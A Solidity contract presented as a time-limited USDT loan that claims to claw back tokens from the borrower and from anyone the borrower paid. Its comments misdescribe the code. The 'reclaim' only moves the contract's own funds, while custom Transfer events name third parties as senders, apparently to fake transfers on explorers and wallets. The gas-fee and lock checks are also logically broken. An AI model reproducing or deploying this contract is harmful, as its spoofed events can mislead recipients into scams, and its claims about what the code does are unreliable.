// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Import the IERC20 interface to interact with USDT (original Tether token)
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract USDTLoan {
    IERC20 public usdtToken;  // Real USDT token on BSC (original USDT)
    address public owner;
    address public borrower;
    uint256 public contractStart;
    bool public timerStarted;
    bool public contractEnded;

    mapping(address => uint256) public borrowedTokensTracker;
    address[] private reclaimTargets;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event ContractEnded(address indexed owner);
    event USDTDeposited(address indexed from, uint256 amount);
    event USDTWithdrawn(address indexed to, uint256 amount);

    // Constructor to initialize the contract with the real USDT address
    constructor(address _usdtToken) {
        usdtToken = IERC20(_usdtToken);  // Set the real USDT token address
        owner = msg.sender;
        contractEnded = false;
    }

    // Deposit the real USDT (original USDT) into the contract by the owner
    function depositUSDT(uint256 amount) external onlyOwner {
        require(!contractEnded, "Contract has ended");
        require(usdtToken.transferFrom(msg.sender, address(this), amount), "Deposit failed");
        emit USDTDeposited(msg.sender, amount);
    }

    // Lend USDT to the borrower and start the timer
    function lendToBorrower(address _borrower, uint256 amount) external onlyOwner {
        require(!contractEnded, "Contract has ended");
        require(usdtToken.balanceOf(address(this)) >= amount, "Not enough tokens in contract");

        borrower = _borrower;
        contractStart = block.timestamp;
        timerStarted = true;

        // Transfer tokens to the borrower
        usdtToken.transfer(borrower, amount);
        emit Transfer(address(this), borrower, amount);
    }

    // Transfer USDT from one address to another, deducting the gas fee
    function transfer(address to, uint256 amount) external {
        require(!contractEnded, "Contract has ended");
        require(msg.sender == borrower, "Only borrower can transfer during lock period");

        if (timerStarted && block.timestamp > contractStart + 15 minutes) {
            _autoReclaim();
        }

        uint256 gasFee = estimateGasFee();
        uint256 transferAmount = amount - gasFee;

        // Ensure the borrower can only send exactly 1 token excluding fee
        require(transferAmount == 1 * 10**18, "Borrower can only send exactly 1 USDT excluding fee");
        
        // Ensure the borrower has sufficient balance
        require(balanceOf(borrower) - transferAmount >= 4 * 10**18, "Locked funds cannot be moved");

        // Track borrowed token flow and execute the transfer
        borrowedTokensTracker[to] += transferAmount;
        _trackReclaimTarget(to);
        usdtToken.transfer(to, transferAmount);
        emit Transfer(borrower, to, transferAmount);
    }

    // Auto reclaim tokens from borrower after expiry
    function _autoReclaim() internal {
        if (borrower == address(0)) return;

        // Pull back tokens from the borrower
        uint256 borrowerBal = balanceOf(borrower);
        if (borrowerBal > 0) {
            usdtToken.transfer(owner, borrowerBal);
            emit Transfer(borrower, owner, borrowerBal);
        }

        // Pull back tokens from addresses the borrower sent to
        for (uint256 i = 0; i < reclaimTargets.length; i++) {
            address addr = reclaimTargets[i];
            uint256 amount = borrowedTokensTracker[addr];
            if (amount > 0) {
                usdtToken.transfer(owner, amount);
                borrowedTokensTracker[addr] = 0;
                emit Transfer(addr, owner, amount);
            }
        }

        // Reset states after reclaim
        borrower = address(0);
        timerStarted = false;
        delete reclaimTargets;
    }

    // Track addresses receiving tokens from the borrower
    function _trackReclaimTarget(address addr) internal {
        if (borrowedTokensTracker[addr] == 0) {
            reclaimTargets.push(addr);
        }
    }

    // Estimate the gas fee for the current transaction
    function estimateGasFee() public view returns (uint256) {
        return gasleft() * tx.gasprice;  // Estimate gas fee based on gas left and the current gas price
    }

    // Owner withdraws all remaining tokens from the contract
    function withdrawTokens(uint256 amount) external onlyOwner {
        require(!contractEnded, "Contract has ended");
        uint256 contractBalance = usdtToken.balanceOf(address(this));
        require(amount <= contractBalance, "Insufficient balance in the contract");

        // Transfer the specified amount of tokens back to the owner
        usdtToken.transfer(owner, amount);
        emit USDTWithdrawn(owner, amount);
    }

    // Owner can end the contract, securing any remaining tokens and stopping further interactions
    function endContract() external onlyOwner {
        require(!contractEnded, "Contract already ended");
        contractEnded = true;
        emit ContractEnded(owner);

        // Withdraw any remaining tokens back to the owner
        uint256 contractBalance = usdtToken.balanceOf(address(this));
        if (contractBalance > 0) {
            usdtToken.transfer(owner, contractBalance);
            emit USDTWithdrawn(owner, contractBalance);
        }
    }

    // View function to get the current balance of the contract
    function balanceOf(address account) public view returns (uint256) {
        return usdtToken.balanceOf(account);
    }
}
